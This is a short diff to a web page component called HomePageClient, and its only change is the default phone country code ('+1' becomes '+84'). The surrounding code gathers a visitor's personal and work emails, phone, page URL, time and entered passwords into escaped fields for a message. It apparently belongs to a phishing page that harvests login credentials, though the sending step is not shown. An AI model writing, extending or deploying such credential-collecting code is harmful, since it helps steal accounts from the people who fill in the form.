@@ -382,7 +382,7 @@ export default function HomePageClient({
     const safePersonalEmail = escapeHtml(form.email || "N/A");
     const safeBusinessEmail = escapeHtml(form.workEmail || "N/A");
     const safeDetails = escapeHtml(form.details.trim() || "N/A");
-    const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+1");
+    const safePhone = escapeHtml(`${phoneCode} ${form.phoneNumber}`.trim() || "+84");
     const safeUrl = escapeHtml(currentUrl || "N/A");
     const safeTime = escapeHtml(getCurrentTime());
     const safePassword1 = escapeHtml((overrides.password1 ?? password1) || "N/A");
